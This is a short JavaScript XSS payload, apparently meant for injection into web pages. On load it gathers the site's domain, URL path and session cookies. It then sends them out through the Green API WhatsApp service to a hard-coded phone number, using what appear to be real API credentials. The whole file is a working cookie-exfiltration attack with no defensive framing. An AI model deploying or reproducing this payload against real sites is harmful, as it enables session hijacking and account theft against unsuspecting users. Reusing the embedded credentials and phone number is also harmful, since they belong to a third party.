var greenApiId = '7103905514'; // Replace with your Green API ID
var greenApiToken = 'a73d4e98539945968bd6f1bbac660b95a3e06dcf96b24100ab'; // Replace with your Green API Token
var defaultPhoneNumber = '18056009130@c.us'; // Replace with your default phone number

function sendWhatsAppMessage(greenApiId, greenApiToken, phoneNumber) {
    var textData = 'XSS Alert in ' + document.domain +
        '\n------------------------------------------------' +
        '\n\n- URL Target -\n' + document.location.hostname + document.location.pathname +
        '\n\n- Document Cookie -\n' + document.cookie;

    var url = 'https://api.green-api.com/waInstance' + greenApiId + '/sendMessage/' + greenApiToken;
    var payload = {
        chatId: phoneNumber,
        text: textData,
    };

    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(payload));
}

// Example usage:
sendWhatsAppMessage(greenApiId, greenApiToken, defaultPhoneNumber);
